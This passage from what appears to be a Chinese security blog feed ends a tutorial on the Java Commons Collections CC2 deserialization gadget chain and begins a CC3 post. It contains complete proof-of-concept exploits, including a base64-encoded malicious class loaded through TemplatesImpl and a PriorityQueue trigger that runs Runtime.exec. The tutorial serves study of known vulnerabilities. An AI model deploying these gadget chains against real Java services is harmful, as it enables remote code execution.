class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        ConstantTransformer Runtime=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        ConstantTransformer l=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chind);</span><br><span class="line">        PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field=ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chind,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object o=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2119ec98/image-20250704221705346.png" alt="image-20250704221705346"></p><p>成功弹出计算机，且由于TransformingComparator.compare()用了两次transform方法，所以会弹两次计算机。</p><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">PriorityQueue -&gt; readObject()</span><br><span class="line">PriorityQueue -&gt; heapify()</span><br><span class="line">PriorityQueue -&gt; siftDown()</span><br><span class="line">PriorityQueue -&gt; siftDownUsingComparator()</span><br><span class="line">TransformingComparator -&gt; compare()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl字节码链分析"><a href="#TemplatesImpl字节码链分析" class="headerlink" title="TemplatesImpl字节码链分析"></a>TemplatesImpl字节码链分析</h3><p>ysoserialpoc是通过执行TemplatesImpl.newTransformer加载恶意字节码来代替InvokerTransformer反射调用Runtime.getRuntine().exec()的，不熟悉TemplatesImpl加载恶意字节码可以看<a href="https://www.cnblogs.com/gaorenyusi/p/18269747">java动态加载字节码</a>，poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Impl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2119ec98/image-20250704233536219.png" alt="image-20250704233536219"></p><p>由于需要执行Impl.newTransformer()方法，所以这里<code>this.transformer</code>需要为InvokerTransformer对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer newtransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>这当obj1为Impl时，执行<code>this.transformer.transform(obj1);</code>就会执行Impl.newTransformer()。而obj的值不影响，随便设。</p><p>所以我们现在需要修改obj1的值，跟进下obj1：</p><p><img src="/archives/2119ec98/image-20250705000544870.png" alt="image-20250705000544870"></p><p>obj1对应的是x，x是通过siftDown传入的</p><p><img src="/archives/2119ec98/image-20250705000730217.png" alt="image-20250705000730217"></p><p>即x对应为queue[i]，而我们一开始传入的size为2，即第一次循环时i为0，所以x对应queue[0]</p><p><img src="/archives/2119ec98/image-20250705002252469.png" alt="image-20250705002252469"></p><p><img src="/archives/2119ec98/image-20250705001321500.png" alt="image-20250705001321500"></p><p>所以我们只用通过反射来修改queue的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>]=Impl;</span><br><span class="line">queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> field.get(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意为了防止PriorityQueue.add方法影响，这里依然需要先传入假的InvokerTransformer对象，这里我们先传入无害的toString方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer newtransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(newtransformer);</span><br></pre></td></tr></table></figure><p>为什么是toString呢，因为在add方法中我们传入的是1，为Integer对象：</p><p><img src="/archives/2119ec98/image-20250705011029589.png" alt="image-20250705011029589"></p><p>而在add调用的offer方法中会调用siftUp(i,e)，而e就是我们的Integer对象</p><p><img src="/archives/2119ec98/image-20250705011147532.png" alt="image-20250705011147532"></p><p>之后执行siftUpUsingComparator方法，其中x就为传入的e，即Integer对象</p><p><img src="/archives/2119ec98/image-20250705011324584.png" alt="image-20250705011324584"></p><p>最后执行<code>comparator.compare(x,(E) e)</code>，所以会调用Integer类中的方法，而该方法需要与我们要执行的newTransformer方法参数一致，这样才好通过反射修改值</p><p><img src="/archives/2119ec98/image-20250705011649152.png" alt="image-20250705011649152"></p><p>所以像图中这种不需要参数的方法都是可以的，这里我们选择的是无危害的toString方法，也可以选择其他的</p><p>然后执行了add后修改回我们的newTrasformer方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setValue(newtransformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>完整poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InvokerTransformer newtransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(newtransformer);</span><br><span class="line">        PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setValue(newtransformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>]=Impl;</span><br><span class="line">        queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object o=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2119ec98/image-20250705012142131.png" alt="image-20250705012142131"></p><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">PriorityQueue -&gt; readObject()</span><br><span class="line">PriorityQueue -&gt; heapify()</span><br><span class="line">PriorityQueue -&gt; siftDown()</span><br><span class="line">PriorityQueue -&gt; siftDownUsingComparator()</span><br><span class="line">TransformingComparator -&gt; compare()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">TemplatesImpl -&gt; newTransformer()</span><br><span class="line">TemplatesImpl -&gt; getTransletInstance()</span><br><span class="line">TemplatesImpl -&gt; defineTransletClasses()</span><br><span class="line">TemplatesImpl -&gt; defineClass()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java</a></p><p><a href="https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9">https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9</a></p><p><a href="https://xz.aliyun.com/news/9835">https://xz.aliyun.com/news/9835</a></p><p><a href="https://www.anquanke.com/post/id/232592#h3-7">https://www.anquanke.com/post/id/232592#h3-7</a></p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/</a></p><p><a href="https://www.cnblogs.com/byErichas/p/15749668.html">https://www.cnblogs.com/byErichas/p/15749668.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC3利用链深度解析</title>
      <link href="/archives/36318858/"/>
      <url>/archives/36318858/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u65</strong></li><li><strong>Commons Collection 3.2.1</strong></li></ul><p>jdk下载地址：<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html#license-lightbox">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html#license-lightbox</a></p><p>由于该链子是在CC1或者CC6的基础上稍稍进行了改变，所以jdk是不受限制的，只不过看是在哪个链子上改变而已。具体环境搭建可以看我之前的<a href="https://b1uel0n3.github.io/2025/06/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9ACC1%E5%88%A9%E7%94%A8%E9%93%BE%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">文章</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于CC3是在CC1或CC6的基础上进行改变的，不熟悉的师傅可看我前两篇文章：</p><p><a href="https://b1uel0n3.github.io/2025/06/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9ACC1%E5%88%A9%E7%94%A8%E9%93%BE%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/">Java 反序列化：CC1 利用链深度解析</a></p><p><a href="https://xz.aliyun.com/news/18341">Java 反序列化：CC6 利用链深度解析</a></p><p>同时该链子需要<strong>类加载机制及如何动态加载字节码</strong>的基础，可参考：</p><p><a 